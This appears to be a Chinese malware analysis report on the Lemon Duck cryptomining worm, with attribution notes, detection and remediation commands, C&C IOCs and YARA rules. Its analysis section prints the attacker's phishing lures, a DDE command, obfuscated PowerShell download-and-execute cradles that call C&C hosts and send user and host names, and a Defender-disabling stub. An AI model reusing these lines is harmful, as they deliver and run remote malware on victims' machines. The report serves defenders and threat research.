åˆ†æå…¶æ”»å‡»ç‰¹å¾ï¼ˆå¦‚çˆ†ç ´å­—å…¸ï¼Œç¤¾ä¼šå·¥ç¨‹å­¦ç›¸å…³å†…å®¹ï¼‰ï¼Œæˆ‘ä»¬æ³¨æ„åˆ°ï¼š

å…¶æ”»å‡»é“¾è·¯å˜åŠ¨ä¸­é’ˆå¯¹è‹±è¯­è¯­ç§çš„ç½‘ç»œç¯å¢ƒçš„ä¼˜åŒ–å±…å¤šï¼Œä¸”æ²¡æœ‰å‡ºç°é’ˆå¯¹ä¸­å›½çš„ç½‘ç»œç¯å¢ƒä½œå‡ºç›¸åº”ä¼˜åŒ–ï¼Œ

è™½ç„¶â€œå°é»„é¸­â€åˆæœŸåœ¨ä¸­å›½çˆ†å‘ï¼Œè€Œä¸”æ”»å‡»æˆæ•ˆæ˜¾è‘—ã€‚

ä½†å¹¶æ²¡æœ‰åç»­å¹¶æœªé’ˆå¯¹ä¸­å›½çš„ç½‘ç»œç¯å¢ƒä½œå‡ºä¼˜åŒ–ï¼ˆè¿™å¯¹äºè¯¥èƒ½åŠ›æ°´å‡†çš„æ”»å‡»è€…æ¥è¯´å‡ ä¹æ²¡æœ‰é—¨æ§›ï¼‰ã€‚

è¿™è¿èƒŒäº†â€œå°é»„é¸­â€æ”»å‡»æ´»åŠ¨ä¸­æ‰€è¡¨éœ²çš„ï¼šå•çº¯åªä¸ºä¾µå å¤§é‡è®¡ç®—èµ„æºâ½¤äºåŠ å¯†è´§å¸æŒ–æ˜çš„ç»æµç›®æ ‡ã€‚



ç»“åˆä»¥ä¸‹å†å²ç›‘æµ‹ä¿¡æ¯æ¥çœ‹ï¼Œæ”»å‡»ä¸æ˜¯å‘ˆç°åˆç†çš„è”“å»¶è¶‹åŠ¿ï¼Œç–‘ä¼¼è¶Šè¿‡éè‹±è¯­å›½å®¶ï¼Œç›´å¥”æ¬§ç¾â€¦â€¦

>   Symantecåœ¨2019å¹´4æœˆçš„åˆ†æï¼š
>
>   80ï¼…ä»¥ä¸Šçš„å—å®³è€…ä½äºä¸­å›½ï¼Œå…¶ä»–å—å®³è€…ä½äºéŸ©å›½ï¼Œæ—¥æœ¬å’Œè¶Šå—ã€‚
>
>   è€Œåˆ°2019å¹´10æœˆï¼Œæ®Sophosçš„æŠ«éœ²ï¼š
>
>   ä¸­å›½å—å®³è€…çš„å æ¯”é™è‡³24%ï¼Œæ–°åŠ å¡17%ï¼Œè‹±å›½è¾¾åˆ°6%ï¼Œç¾å›½3%ï¼Œè€Œä¹‹å‰è¾ƒå¤šçš„éŸ©æ—¥è¿™æ¬¡å æ¯”è¿˜åœ¨å…¶åã€‚
>
>   <img src="./README.assets/20200618duckbar.png" alt="" style="zoom:45%;" />



è¿™ä½¿å¾—æ”»å‡»è€…å…·æœ‰ä¸¤ç§å¯èƒ½ï¼š

*   å¢ƒå†…æ”»å‡»è€…ï¼ŒåæœŸæœ‰æ„é¿å¼€å¢ƒå†…ç¯å¢ƒ
*   è‹±è¯­æ¯è¯­æ”»å‡»è€…ï¼Œå¯¹è‹±è¯­è¯­ç§ä»¥å¤–çš„ç½‘ç»œç¯å¢ƒä¸ç†Ÿæ‚‰

é€šè¿‡è¡Œä¸º/æ¶æ„èµ„äº§/ä»£ç é£æ ¼åŠå‘½åå€¾å‘ç‰¹å¾æ¨æµ‹å…¶åº”ä¸ºä½¿ç”¨è‹±è¯­è¯­ç§çš„æ”»å‡»è€…ï¼Œæ‰€ä»¥æˆ‘ä»¬æ›´å€¾å‘äºç¬¬äºŒç§å¯èƒ½ã€‚



## å…³äºå‘½åï¼šä¸ºå•¥å«å°é»„é¸­ï¼Ÿ

![img](./README.assets/20200611lemon_duck.jpg)

åœ¨åˆ†æä¸­å‘ç°ï¼š

C&Cè¯·æ±‚å¤´çš„å”¯ä¸€å‡ºç°çš„Headeré…ç½®User-Agentä½¿ç”¨äº†æ¯”è¾ƒæœ‰æ„æ€çš„å‰ç¼€`Lemon-Duck`ï¼š

```powershell
$Lemon_Duck='MTXDaxu\qWPoOkQu'; #å†å²ç‰ˆæœ¬å‡ºç°è¿‡çš„å˜é‡èµ‹å€¼
$Lemon_Duck='\'; #è¿‘æœŸæ”»å‡»ä¸­çš„èµ‹å€¼

$webclient.Headers.add("User-Agent","Lemon-Duck-"+$Lemon_Duck.replace('\','-'))
# User-Agent: Lemon-Duck--
```

æµ‹è¯•ä¸­å‘ç°User-Agentä¸­å€¼çš„å˜åŒ–éƒ½å¯¹äºè¿”å›çš„ç»“æœæ— å½±å“ï¼ˆæ­¤å˜é‡åº”åªæ˜¯ä¸€ç§ä¿¡æ¯åé¦ˆçš„å­—æ®µï¼‰ã€‚

è€Œåˆ›å»ºçš„è®¡åˆ’ä»»åŠ¡ä¸­è¿½è¸ªåˆ°å‡ ä¸ªæ¯”è¾ƒæœ‰æ„æ€çš„å›ºå®šå‘½åï¼Œåˆ†åˆ«åœ¨ä»¥ä¸‹ä¸åŒæ—¶æœŸä¸­å‡ºç°ï¼š

"Ddrivers" 2018å¹´12æœˆ 

"MicrosoftwindowsBluetooths" 2018å¹´12æœˆ 

"Rtsa" 	2019å¹´09æœˆ

"bluetool" 2019å¹´11æœˆ

"Rtsa1"/"Rtsa2" 2020å¹´2æœˆ

"bluetea"  2020å¹´4æœˆ

```powershell
# mail.jsp
# report.jsp
# a.sjp
$stsrv.GetFolder("\").GetTask("bluetea")
```

æœ‰äº›æŠ¥å‘Šé‡Œå°†å…¶å‘½åä¸ºâ€œè“èŒ¶è¡ŒåŠ¨â€

åœ¨åç»­ä¸­å‘½åå˜æ›´ä¸ºâ€œblackballâ€  2020å¹´5æœˆ

```powershell
# mail.jsp
# report.jsp
# a.jsp
$stsrv.GetFolder("\").GetTask("blackball")
```

ç…§è¿™ç§è§„èŒƒï¼Œæ­¤æ¬¡åº”è¯¥å«â€œé»‘çƒâ€ï¼Œæˆ–è€…â€œé»‘ä¸¸â€è¿˜å¥½å¬ç‚¹ï¼Ÿï¼ˆ[æœ‰å‚å®¶åœ¨6æœˆ3æ—¥çš„æŠ¥å‘Šä¸­ï¼Œå°†å…¶å‘½åä¸ºâ€œé»‘çƒè¡ŒåŠ¨â€â€¦â€¦](https://mp.weixin.qq.com/s/QEE95HTKzuT4-NykfvHfGQ)ï¼‰



æ‰€ä»¥ç”¨Lemon-Duckæ›´å…·æœ‰ä»£è¡¨æ€§ä¸€äº›ï¼š

â€Lemon-Duckâ€œæ„è¯‘ä¸ºä¸­æ–‡åº”ä¸ºï¼šâ€œå°é»„é¸­â€



å°è¯•æŒ–æ˜ä¸‹ç‰¹å¾å˜é‡åèƒŒåçš„æ„ä¹‰ï¼š

blueteaï¼š

è¶è±†èŠ±ï¼ˆButterfly Pea Teaï¼‰ä¹Ÿç§°ä¸ºè“èŠ±è¶ã€è“èŠ±è±†ã€è´è¶èŠ±è±†ç­‰åç§°ï¼Œè€ŒåŒ—ç¾äººé€šå¸¸ç§°è¶è±†èŠ±èŒ¶ä¸ºBlue Matcha æˆ–Blue Chai, ä¹Ÿæœ‰äººç›´æ¥ç§°ä¹‹ä¸ºBlue Teaã€‚



blackballï¼š

â€œé»‘ä¸¸â€ï¼Ÿ

å‘ç°å°æ¹¾æœ‰å®¶å¥¶èŒ¶è¿é”å«ä½œblackballï¼Œçç å¥¶èŒ¶é‡Œçš„çç ï¼Ÿ



æœ‰ç‚¹å—åˆ°å¯ç¤ºï¼š

è¿™ä¸¤ç§ç©æ„éƒ½å¯ä»¥ä½œä¸ºå¥¶èŒ¶çš„åŸæ–™ï¼Œéš¾é“è¯´æ­¤æ”»å‡»æºè‡ªä¸å¥¶èŒ¶ğŸ¥›çˆ±å¥½è€…ï¼Ÿ



## æ£€æµ‹æ–¹æ¡ˆ

* å¯æ ¹æ®åç»­åˆ—å‡ºçš„IOCsä¿¡æ¯å¯¹ç›¸å…³ä¸»æœºè¿›è¡Œæ’æŸ¥ï¼›

* æŸ¥çœ‹ç›¸å…³ä¸»æœºCPUæ˜¯å¦è¿è¡Œæœ‰å¼‚å¸¸ï¼Œæ¯”å¦‚CPUå ç”¨è¿‡é«˜ï¼›

* æŸ¥çœ‹å†…ç½‘ä¸»æœºåŠç›¸å…³ç«¯å£å¦‚445ã€1433ã€3389ã€65529ã€65533ç­‰ç«¯å£æ˜¯å¦å¼€å¯ä¸”æœ‰è¿‡è¢«æ‰«ææˆ–æš´åŠ›ç ´è§£è¡Œä¸ºï¼›

* æ£€æµ‹ç›¸å…³ä¸»æœºæ˜¯å¦å­˜åœ¨CVE-2017-8570åŠMS17-010é«˜å±æ¼æ´ï¼›

* è¿½æŸ¥åŒæ ·æœ¬é‚®ä»¶ç›¸å…³çš„é‚®ç®±åœ°å€ï¼Œåœ¨å…¶æ¥æ”¶é‚®ä»¶ä¸»æœºåŒç½‘åŸŸå†…è¿›è¡Œå…¨é¢æ£€æµ‹æ‰«æï¼›

## ä¿®å¤å»ºè®®

ä½¿ç”¨ç®¡ç†å‘˜æƒé™æ‰“å¼€Poweshellè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š

å»é™¤å·²å†™å…¥çš„ç½‘ç»œè§„åˆ™ï¼š

```powershell
netsh advfirewall firewall delete rule name="SDNSd"
netsh advfirewall firewall delete rule name="DNSd"
netsh interface portproxy delete v4tov4 listenport=65529
netsh interface portproxy delete v4tov4 listenport=65533

# å¦‚æœéœ€è¦æä¾›SMBæœåŠ¡åˆ™ä¸ç”¨æ‰§è¡Œä»¥ä¸‹å‘½ä»¤
netsh advfirewall firewall delete rule name="deny445"
netsh advfirewall firewall delete rule name="deny445"
```

æŸ¥çœ‹å®šæ—¶ä»»åŠ¡ï¼š

```powershell
function Get-AllTaskSubFolders {
    [cmdletbinding()]
    param (
        $FolderRef = $Schedule.getfolder("\")
    )
    if ($FolderRef.Path -eq '\') {
        $FolderRef
    }
    if (-not $RootFolder) {
        $ArrFolders = @()
        if(($folders = $folderRef.getfolders(1))) {
            $folders | ForEach-Object {
                $ArrFolders += $_
                if($_.getfolders(1)) {
                    Get-AllTaskSubFolders -FolderRef $_
                }
            }
        }
        $ArrFolders
    }
}

$Schedule = New-Object ComObject ("Schedule.Service");
$Schedule.connect($env:COMPUTERNAME);

foreach ($Folder in Get-AllTaskSubFolders) {
    if (($Tasks = $Folder.GetTasks(1))) {
        $Tasks | Foreach-Object {
            if (($_.State -gt 1)) {
                New-Object -TypeName PSCustomObject -Property @{
                            'Name' = $_.name
                            'State' = switch ($_.State) {
                                0 {'Unknown'}
                                1 {'Disabled'}
                                2 {'Queued'}
                                3 {'Ready'}
                                4 {'Running'}
                                Default {'Unknown'}
                            }
                            'Path' = $_.path
                }
            }
        }
    }
}
```

æŸ¥çœ‹æ˜¯å¦å…·æœ‰æ˜æ˜¾éšæœºçš„ä»»åŠ¡åï¼Œç„¶åæ ¹æ®è·¯å¾„åˆ é™¤ï¼š

```powershell
schtasks /delete /tn PATH /F
```



*  å¦‚å‘ç°ä¸­æ‹›ä¸»æœºï¼Œåº”ç«‹å³åˆ‡æ–­ç½‘ç»œï¼Œå…³é—­445ç«¯å£æœåŠ¡ï¼Œè¿›è¡Œå…¨é¢æŸ¥æ€ï¼›

*  å¯¹CVE-2017-8570ï¼ŒMS17-010ï¼ŒCVE-2020-0796ç›¸å…³æ¼æ´åŠæ—¶æ‰“è¡¥ä¸ï¼š

    *  CVE-2017-8570è¡¥ä¸ä¿¡æ¯å‚è€ƒï¼šhttps://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2017-8570; 
*  MS17-010è¡¥ä¸ä¿¡æ¯å‚è€ƒï¼šhttps://support.microsoft.com/zh-cn/help/4012598/title
    *  CVE-2020-0796ä¿¡æ¯å‚è€ƒï¼šhttps://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0796



## é˜²èŒƒå»ºè®®

*   åœæ­¢ä½¿ç”¨Win7ï¼ˆ20201æœˆ14æ—¥åå¾®è½¯å·²åœæ­¢å¯¹å…¶ç»´æŠ¤ï¼‰

*   åŠæ—¶å¯¹å†…ç½‘ä¸»æœºæ‰“è¡¥ä¸ï¼›

*   åŠ å¼ºç³»ç»Ÿå®‰å…¨æ€§ã€‚èº«ä»½éªŒè¯å’ŒåŠ å¯†æœºåˆ¶æœ‰åŠ©äºé˜²æ­¢å¯¹ç›®æ ‡ç³»ç»Ÿè¿›è¡Œæœªç»æˆæƒçš„ä¿®æ”¹ï¼Œä½¿ç”¨é«˜å¼ºåº¦å¯†ç ï¼Œå¹¶å®šæœŸæ›´æ–°ï¼Œä¸è¦ä½¿ç”¨å¼±å£ä»¤ï¼›

*   å¤šå°è®¾å¤‡ä¸è¦ä½¿ç”¨ç›¸åŒå¯†ç ï¼Œè •è™«ä¼šæŠ“å–æœ¬æœºå¯†ç ï¼Œæ”»å‡»å±€åŸŸç½‘ä¸­çš„å…¶å®ƒæœºå™¨ï¼›

*   å…³é—­ä¸»æœºä¸å¿…è¦çš„ç«¯å£ï¼ˆå¦‚445ï¼Œ65529ç­‰ï¼‰ï¼Œå¹¶ä½¿ç”¨ä¸¥æ ¼çš„æƒé™æ§åˆ¶ï¼›

*   éƒ¨ç½²å…¶ä»–å®‰å…¨æœºåˆ¶ï¼Œä¾‹å¦‚è¡Œä¸ºç›‘è§†ï¼Œä»¥æ£€æµ‹å¹¶é˜²æ­¢å¼‚å¸¸ä¾‹ç¨‹æˆ–æœªæˆæƒç¨‹åºæˆ–è„šæœ¬çš„è¿è¡Œã€‚ä¼ä¸šå†…IDS/IPSé˜²æŠ¤è®¾å¤‡æ ¹æ®åç»­åˆ—å‡ºçš„Yaraæ£€æµ‹è§„åˆ™è¿›è¡Œæ›´æ–°ï¼›

*   ç¦ç”¨PowerShellï¼Œå› ä¸ºæ™®é€šç”¨æˆ·å’ŒéæŠ€æœ¯ç”¨æˆ·éƒ½ä¸éœ€è¦ï¼š

    ä½¿ç”¨ç®¡ç†å‘˜æƒé™æ‰“å¼€Powershellï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œç„¶åå›è½¦

    ```powershell
    Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root
    ```


*   é˜»æ­¢ä»Officeæ–‡æ¡£ä¸­åµŒå…¥æˆ–é“¾æ¥çš„COMå¯¹è±¡ï¼Œè¯·æ‰§è¡Œä»¥ä¸‹æ­¥éª¤ï¼š

    ```powershell
    reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\Common\COM Compatibility\{F20DA720-C02F-11CE-927B-0800095AE340}" /v "Compatibility Flags" /t REG_DWORD /d 0x400
    reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Office\Common\COM Compatibility\{F20DA720-C02F-11CE-927B-0800095AE340}" /v "ActivationFilterOverride" /t REG_DWORD /d 0x1
    
    reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Office\Common\COM Compatibility\{F20DA720-C02F-11CE-927B-0800095AE340}" /v "Compatibility Flags" /t REG_DWORD /d 0x400
    reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Office\Common\COM Compatibility\{F20DA720-C02F-11CE-927B-0800095AE340}" /v "ActivationFilterOverride" /t REG_DWORD /d 0x1
    ```

*   ç¦ç”¨SMBçš„å‹ç¼©åŠŸèƒ½ï¼š

    ```powershell
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" DisableCompression -Type DWORD -Value 1 -Force
    ```

    



## IOCs

ä»¥ä¸‹æ˜¯æœ‰å…³è¯¥APTæ´»åŠ¨çš„ç›¸å…³IoCs:

### Domainï¼š

C&C:

```
abbny.com
p.abbny.com
info.abbny.com

haqo.net
i.haqo.net
info.haqo.net

beahh.com
v.beahh.com
w.beahh.com
p.beahh.com
d.beahh.com
oom.beahh.com
info.beahh.com

minicen.ga
img.minicen.ga
t.minicen.ga


y6h.net
v.y6h.net

zer2.com
lpp.zer2.com
t.zer2.com

awcna.com   (2020-04-21åœæ­¢è§£æ)
t.awcna.com

tr2q.com
t.tr2q.com  (2020-05-20åœæ­¢è§£æ)

amynx.com   (æœªå¯ç”¨)
t.amynx.com (æœªå¯ç”¨) ï¼ˆ2020-05-26å‘ç°å¯ç”¨ï¼‰

zer9g.com
t.zer9g.com  (2020-05-21æ–°å¢,å–ä»£t.tr2q.com)

zz3r0.com    
t.zz3r0.com  (2020-05-25æ–°å¢,å–ä»£t.awcna.comï¼‰)


jdjdcjq.top
t.jdjdcjq.top (2020-06-01æ–°å¢ï¼Œç”¨äºLinux)
```

Miner Pools & Payload Serverï¼š

```shell
# çŸ¿æ± åœ°å€
lpp.zer2.com
lp.haqo.net
lpp.awcna.com
lplp.haqo.net
lplp.beahh.com
lplp.abbny.com
lplp.ackng.com

p.k3qh4.com
p.b69kq.com

# Payloadå­˜æ”¾
d.ackng.com 
info.ackng.com
down.ackng.com

haqo.net
dl.haqo.net
```

### IP:

```powershell
66.42.43.37
172.104.7.85

207.154.225.82
128.199.183.160

206.189.144.115
138.68.30.50

128.199.64.236

161.35.107.193

167.71.87.85
45.79.77.20

# proxy
84.39.112.58
95.211.168.228
```

### MD5:

ç”±äº

```
98bf04d3d6e25c0cac4ac6af604bcdbf 
779c89b9404bdd69547c28885167f131
d0b03daf3c84987768bd4ce8e2a77548
51f6eba99e2b33e5458d78e41a130fe2
db50d9392ea9dd0efceb2364f0e2f187
5d4d94ee7e06bbb0af9584119797b23a
f3b25701fe362ec84616a93a45ce9998
df5c8f7677a3361d17cc1ba820436ce9
```

### Ports:

```
43668
65529
65533
```

### File:

```shell
# Windows
$env:tmp\GkwiGedjuq8391j.txt
$env:tmpGkPiGedjuq8f91j.txt
$env:tmp\godmali3.txt
$env:tmp\kk4kk.log
$env:tmp\nvdg.dat
$env:temp\tt.vbs
# Linux 
/.Xll/xr
# Driver
DRIVE:\UTFsync\\inf_data
```



### Yara:

CVE-2017-8570æ”»å‡»æ–‡ä»¶ YARAæ£€æµ‹è§„åˆ™ï¼š

```yacas
rule rtf_composite_moniker {
   meta:
      ref = "https://justhaifei1.blogspot.co.uk/2017/07/bypassing-microsofts-cve-2017-0199-patch.html"
   strings:
      $header_rtf = "{\\rt" nocase
      $composite_moniker = "0903000000000000C000000000000046" nocase
      $new_moniker = "C6AFABEC197FD211978E0000F8757E2A" nocase
   condition:
      $header_rtf at 0 and $composite_moniker and $new_moniker
}
```

DDE æ–‡ä»¶ YARAæ£€æµ‹è§„åˆ™ï¼š

```yacas
// YARA rules Office DDE
// NVISO 2017/10/10 - 2017/10/12
// https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/
 
rule Office_DDEAUTO_field {
  strings:
    $a = /<w:fldChar\s+?w:fldCharType="begin"\/>.+?\b[Dd][Dd][Ee][Aa][Uu][Tt][Oo]\b.+?<w:fldChar\s+?w:fldCharType="end"\/>/
  condition:
    $a
}
rule Office_DDE_field {
  strings:
    $a = /<w:fldChar\s+?w:fldCharType="begin"\/>.+?\b[Dd][Dd][Ee]\b.+?<w:fldChar\s+?w:fldCharType="end"\/>/
  condition:
    $a
}
rule Office_OLE_DDEAUTO {
  strings:
    $a = /\x13\s*DDEAUTO\b[^\x14]+/ nocase
  condition:
    uint32be(0) == 0xD0CF11E0 and $a
}
rule Office_OLE_DDE {
  strings:
    $a = /\x13\s*DDE\b[^\x14]+/ nocase
  condition:
    uint32be(0) == 0xD0CF11E0 and $a
}
```

Mimikatz YARAæ£€æµ‹è§„åˆ™ï¼š

```yacas
rule mimikatz
{
	meta:
		description		= "mimikatz"
		author			= "Benjamin DELPY (gentilkiwi)"
		tool_author		= "Benjamin DELPY (gentilkiwi)"
	strings:
		$exe_x86_1		= { 89 71 04 89 [0-3] 30 8d 04 bd }
		$exe_x86_2		= { 8b 4d e? 8b 45 f4 89 75 e? 89 01 85 ff 74 }
		$exe_x64_1		= { 33 ff 4? 89 37 4? 8b f3 45 85 c? 74}
		$exe_x64_2		= { 4c 8b df 49 [0-3] c1 e3 04 48 [0-3] 8b cb 4c 03 [0-3] d8 }
		$dll_1			= { c7 0? 00 00 01 00 [4-14] c7 0? 01 00 00 00 }
		$dll_2			= { c7 0? 10 02 00 00 ?? 89 4? }
		$sys_x86		= { a0 00 00 00 24 02 00 00 40 00 00 00 [0-4] b8 00 00 00 6c 02 00 00 40 00 00 00 }
		$sys_x64		= { 88 01 00 00 3c 04 00 00 40 00 00 00 [0-4] e8 02 00 00 f8 02 00 00 40 00 00 00 }
	condition:
		(all of ($exe_x86_*)) or (all of ($exe_x64_*)) or (all of ($dll_*)) or (any of ($sys_*))
}
```



### PUBLIC KEYï¼š

æ”»å‡»è€…ä½¿ç”¨ç”¨æ¥éªŒè¯C&CæœåŠ¡å™¨è¿”å›å†…å®¹çš„RSAå…¬é’¥ï¼š

```
-----BEGIN RSA PUBLIC KEY-----
2mWo17uXvG1BXpmdgv8v/3NTmnNubHtV62fWrk4jPFI9wM3NN2vzTzticIYHlm7K3r2mT/YR0WDciL818pLubLgum30r0Rkwc8ZSAc3nxzR4iqef4hLNeUCnkWqulY5C0 M85bjDLCpjblz/2LpUQcv1j1feIY6R7rpfqOLdHa10=
-----BEGIN RSA PUBLIC KEY-----
```



#### å…¶ä½¿ç”¨çš„IEX (invoke-expression) æ··æ·†:

```powershell
# mail.jsp
( $SHEllid[1]+$sHELlID[13]+'X')
( $EnV:cOmSpeC[4,15,25]-JoiN'')
## 2020-05-21
( $VErboseprEFereNCe.TOstRING()[1,3]+'X'-joIN'')
# x.jsp
( $sHEllid[1]+$ShELlID[13]+'x')
( ([StrINg]$vERbosepRefEreNcE)[1,3]+'X'-jOIN'') 
$sHeLlID[1]+$ShELLID[13]+'X'
# if.bin
( $SHElLid[1]+$sHElLID[13]+'X')
$PSHOME[4]+$pSHoMe[30]+'x'
( $pSHoMe[21]+$PShoME[30]+'x')
# report.jsp
((varIABlE '*mDR*').NAME[3,11,2]-jOin'')
((Gv '*mdR*').nAme[3,11,2]-joiN'')
# a.jspmail
(([strINg]$VErBoSeprEFErenCE)[1,3]+'x'-Join'')
( $ShelLId[1]+$sHelliD[13]+'x') 
( $enV:comSPec[4,15,25]-jOin'')
## 2020-05-21
( $pSHOMe[21]+$pSHome[34]+'X')

# if_main.bin
( $VerbOsepReFeRencE.TOsTring()[1,3]+'x'-jOin'')
((vArIaBLe '*MDr*').Name[3,11,2]-JoiN'')
( $Env:comSPEc[4,15,25]-JoIN'') 

# 7p.php
( $ShelLiD[1]+$SHellid[13]+'X')
( $pShOmE[4]+$PsHomE[34]+'X')
# rdp.jsp
( $VErboseprEFereNCe.TOstRING()[1,3]+'X'-joIN'')
( $PShOME[4]+$pShOmE[34]+'X')
( $Env:comsPeC[4,26,25]-jOin'')

# ipc.ps1
((VaRiaBlE '*MDr*').NAme[3,11,2]-jOIN'')
( $VeRboseprefERENcE.toSTRiNg()[1,3]+'X'-JOIn'')
```



## è¯¦ç»†åˆ†æ

![killchain](./README.assets/20200611Lemon_duck.png)




æˆ‘ä»¬ä»¥å…¶ä¸­ä¸€æ¬¡è§‚æµ‹åˆ°çš„æ”»å‡»é“¾ä¸ºä¾‹ï¼Œæ¢³ç†ä¸‹æ•´ä¸ªæ”»å‡»æµç¨‹ ï¼š

### ä»æ”¶åˆ°é‚®ä»¶å¼€å§‹

æˆ‘ä»¬æ”¶åˆ°ä¸€å°æ¥è‡ªå¸¸ç”¨è”ç³»äººçš„é‚®ä»¶ï¼Œå¯èƒ½åŒ…å«ä»¥ä¸‹å†…å®¹ï¼š

```powershell
("The Truth of COVID-19","Virus actually comes from United States of America"),
("COVID-19 nCov Special info WHO","very important infomation for Covid-19 see attached document for your action and discretion."),
("HALTH ADVISORY:CORONA VIRUS","the outbreak of CORONA VIRUS is cause of concern especially where forign personal have recently arrived or will be arriving at various intt in near future.see attached document for your action and discretion."),

("WTF","what's wrong with you?are you out of your mind!!!!!"),

("What the fcuk","are you out of your mind!!!!!what 's wrong with you?"),
("good bye","good bye, keep in touch"),
("farewell letter","good bye, keep in touch"),
("broken file","can you help me to fix the file,i can't read it"),
("This is your order?","file is brokened, i can't open it")
)
```

å› ä¸ºé‚®ä»¶æ¥è‡ªäºç†ŸçŸ¥çš„äººï¼Œè¿™å°é‚®ä»¶æŠ•é€’æˆåŠŸå¹¶è¢«é˜…è¯»çš„å¯èƒ½æ€§å¾ˆå¤§ã€‚

å…¶ä¸­åŒ…å«ä¸¤ä¸ªé™„ä»¶ï¼š

`Readme.doc` å’Œ `Readme.zip`

æ‰“å¼€ `Readme.doc` ï¼Œè‹¥ç”µè„‘ç³»ç»Ÿå­˜åœ¨CVE-2017-8570æ¼æ´ï¼Œåœ¨æ–‡æ¡£æ‰“å¼€æ—¶ï¼Œå…¶Packageå¯¹è±¡åŒ…å«çš„ç”±å‘ä»¶æ–¹éšæœºå‘½åç”Ÿæˆçš„`.sct`æ¶æ„è„šæœ¬æ–‡ä»¶ä¼šè‡ªåŠ¨é‡Šæ”¾åˆ°æˆ‘ä»¬çš„ä¸´æ—¶ç›®å½•ï¼Œè¯¥`.sct`æ–‡ä»¶è¢«æ–‡æ¡£ä¸­çš„ç¬¬äºŒä¸ªobjdataå¯¹è±¡åŠ è½½å¹¶æ‰§è¡Œã€‚

æ–‡æ¡£æ‰“å¼€åçš„æˆªå›¾ï¼š

<img src="./README.assets/20200611image-20200507152621697.png" alt="" style="zoom:25%;" />



æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜èƒ½çœ‹åˆ°è¿™æ ·çš„å‘Šè­¦ï¼š



<img src="./README.assets/20200611image-20200526172635190.png" style="zoom:50%;" />



è¿™æ˜¯ç”±äºåœ¨RTFæ–‡æ¡£ä¸­è¿˜åˆ©ç”¨OfficeDDEåŠŸèƒ½è¿›è¡Œæ‰§è¡Œ,ä»¥æé«˜æ”»å‡»æˆåŠŸå‡ ç‡ï¼š

```powershell
$dde_cmd="powershell [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');[Microsoft.VisualBasic.Interaction]::GetObject('script:%tmp%\$filename').Exec(0)&"
```



ä»¥ä¸‹æ˜¯è§£æåçš„åœ¨`.sct`æ–‡ä»¶ä¸­æ’å…¥çš„Powershellå‘½ä»¤ï¼š

```powershell
IEx(New-Object Net.WebClient).DownLoadString(\'http://t.tr2q.com/7p.php?0.7*mail_doc*%username%*%computername%*\'+[Environment]::OSVersion.version.Major);
bpu (\'http://t.tr2q.com/mail.jsp?doc_0.7\');
del %tmp%\\RANDOM.sct
```

æ‰§è¡Œå`.sct`è¿˜ä¼šå°†è‡ªå·±ä»ä¸´æ—¶ç›®å½•ä¸­åˆ é™¤ã€‚



#### 7p.php  (BypassUAC)

```
http://t.tr2q.com/7p.php?0.7*mail_doc*<SYS ENV>
(MD5 = f8dc697b1812f61cf56bb656e90eabce)
```

å»é™¤å¤šå±‚æ··æ·†åï¼Œå‘ç°å…¶å®šä¹‰:

å‡½æ•°bpu  (BypassUACçš„æ„æ€ï¼Œå‘½åè§„èŒƒçœŸå¥½ï¼Œä¸è¾“æ™®é€šç¨‹åºçŒ¿)

```powershell
function bpu($payload){
	# windowsç‰ˆæœ¬
	$ver=[Environment]::OSVersion.Version.Major
	# # å…³é—­WindowsDefender å®æ—¶é˜²æŠ¤
	# cmd /c echo Set-MpPreference -DisableRealtimeMonitoring 1;
	# Add-MpPreference -ExclusionPath c:\;
	# Add-MpPreference -ExclusionProcess c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe|powershell -w hidden
	}
	# å¦‚æœæ˜¯win10
	if ($ver -eq 10) {
	# â€¦â€¦
	}
	# UACç»•è¿‡è·å¾—ç®¡ç†å‘˜æƒé™
	# â€¦â€¦
}
```

ç”¨ä»¥å…³é—­WindowsDefenderå®æ—¶é˜²æŠ¤ï¼Œå’Œä»¥ç®¡ç†å‘˜æƒé™æ‰§è¡Œä¼ å…¥çš„è¿œç¨‹è„šæœ¬



#### mail.jsp (create schtasks)

```
http://t.tr2q.com/mail.jsp?doc_0.7\
(MD5 = 51f6eba99e2b33e5458d78e41a130fe2)
```



```powershell
$v="?$v"+(Get-Date -Format '_yyyyMMdd')
# å­˜å‚¨æ”»å‡»æŒ‡ä»¤çš„å˜é‡
$tmps='function a($u){$d=(Ne`w-Obj`ect Net.WebC`lient)."DownloadData"($u);$c=$d.count;if($c -gt 173){$b=$d[173..$c];$p=New-Object Security.Cryptography.RSAParameters;$p.Modulus=[convert]::FromBase64String(''2mWo17uXvG1BXpmdgv8v/3NTmnNubHtV62fWrk4jPFI9wM3NN2vzTzticIYHlm7K3r2mT/YR0WDciL818pLubLgum30r0Rkwc8ZSAc3nxzR4iqef4hLNeUCnkWqulY5C0M85bjDLCpjblz/2LpUQcv1j1feIY6R7rpfqOLdHa10='');$p.Exponent=0x01,0x00,0x01;$r=New-Object Security.Cryptography.RSACryptoServiceProvider;$r.ImportParameters($p);if($r.verifyData($b,(New-Object Security.Cryptography.SHA1CryptoServiceProvider),[convert]::FromBase64String(-join([char[]]$d[0..171])))){I`ex(-join[char[]]$b)}}}$url=''http://''+''U1''+''U2'';a($url+''/a.jsp'+$v+'?''+(@($env:COMPUTERNAME,$env:USERNAME,(get-wmiobject Win32_ComputerSystemProduct).UUID,(random))-join''*''))'
# åˆ¤æ–­å½“å‰æ˜¯å¦æ˜¯è¶…çº§ç®¡ç†å‘˜æƒé™
$sa=([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
# DGAå‡½æ•°(å…¶å®æ˜¯çº¯éšæœºå­—ä¸²å‡½æ•°)
